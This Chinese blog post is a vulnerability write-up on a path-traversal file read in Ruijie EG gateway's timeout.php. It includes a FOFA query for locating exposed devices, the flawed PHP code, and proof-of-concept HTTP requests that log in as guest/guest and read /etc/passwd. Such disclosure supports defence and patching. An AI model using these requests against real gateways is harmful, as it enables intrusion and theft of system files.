---
title: "锐捷-EWEB timeout.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-fileread.html
asset_dir: assets/锐捷-eweb-timeout.php-文件读取漏洞
---

# 锐捷-EWEB timeout.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/26 18:36
- 1207浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

硬件

计算机硬件

软件

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 的 `getFileAction` 存在 任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `getFileAction` 逻辑的实现

```
function getFileAction(){
    $fileName = p("fileName");
    $config = @file_get_contents(DS . "data" . DS . $fileName);    //获取web配置信息
    $config = iconv('GBK//IGNORE', 'UTF-8', $config);
    if ($config == false) {
        $config = '';
    }
    json_echo($config);
}
```

getFileAction 接收一个 fileName 参数，将其直接拼接到 `file_get_contents` 函数的 `$filename`

部分读取，无任何过滤或校验，因此造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

深入探索

服务器安全服务

物流软件安全

技术文章订阅

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB timeout.php 文件读取漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 读取文件

```
POST /system_pi/timeout.php?a=getFile HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

fileName=../etc/passwd
```

[![锐捷-EWEB timeout.php 文件读取漏洞](images/img-002-706ec117bdb5.webp)](https://image.mrxn.net/cc8783a4e29d4810997da79d401c62ef.webp)

成功读取到 `/etc/passwd` 内容

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.读取文件](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
